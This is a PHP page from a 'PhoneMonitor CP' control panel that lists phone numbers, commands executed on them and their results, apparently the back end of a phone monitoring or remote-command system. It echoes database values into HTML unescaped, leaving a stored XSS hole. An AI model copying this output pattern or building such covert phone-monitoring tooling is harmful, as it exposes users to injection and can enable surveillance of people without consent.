<?php
require_once('./authenticate.php');
?>
<html>
    <head>
        <meta charset="utf-8"> 
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <!-- Latest compiled and minified CSS -->
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/css/bootstrap.min.css">

        <!-- jQuery library -->
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

        <!-- Popper JS -->
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.6/umd/popper.min.js"></script>

        <!-- Latest compiled JavaScript -->
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js"></script>

        <!-- Font awesome JavaScript -->
        <script src="https://use.fontawesome.com/53d43f5815.js"></script>
        <title>Latest outputs</title>
    </head>
    <body>

        <nav class="navbar navbar-expand-sm navbar-dark bg-dark">
            <div class="navbar-brand">PhoneMonitor CP</div>
            <ul class="navbar-nav">
                <li class="nav-item"><a href="./clientlist.php" class="nav-link">Clients</a></li>
                <li class="nav-item active"><a href="./outputlist.php" class="nav-link">Outputs</a></li>
                <li class="nav-item"><a href="./commandlist.php" class="nav-link">Commands</a></li>
            </ul>
            <ul class="navbar-nav ml-auto">
                <li class="nav-item">
                    <div class="dropdown">
                        <button type="button" class="btn btn-outline-secondary dropdown-toggle" data-toggle="dropdown"><?=$_SESSION['username']?> </button>
                        <div class="dropdown-menu dropdown-menu-right">
                            <a class="dropdown-item" href="./logout.php">Log out</a>
                        </div>
                    </div>
                </li>
            </ul>
        </nav>


        <table class="table table-striped table-hover table-sm table-bordered">
            <thead>
                <th>SN</th>
                <th>Number</th>
                <th>Command</th>
                <th>Executed</th>
                <th>Result</th>
            </thead>
            <?php
            include('./helperfuncs.php');
            $getoutputlistquery="SELECT Number, ExecutedDateTime, CommandId, Result FROM clientlist 
            JOIN commandlist ON UniqueId=DeviceUniqueId WHERE Pending=0 ORDER BY ExecutedDateTime DESC";
            $conn=@new mysqli($DB_HOST,$DB_USERNAME,$DB_PASSWORD,$DB_NAME);
            if($conn->connect_errno==0)
            {
                $response=$conn->query($getoutputlistquery);
                if($response)
                {
                    $row_num=0;
                    echo("<tbody>");
                    while($row=$response->fetch_assoc())
                    {
                        echo("<tr>");
                        echo("<td>".++$row_num."</td>"."<td>".$row['Number']."</td>"."<td>"
                            .getCommandString($row['CommandId'])."</td>"."<td>"
                            .date('h:i:s a | l, F j, Y',strtotime($row['ExecutedDateTime']))
                            ."</td>"."<td>".$row['Result']."</td>");
                        echo("</tr>");
                    }
                    echo("</tbody>");
                }
            }
            ?>
        </table>
 
    </body>
</html>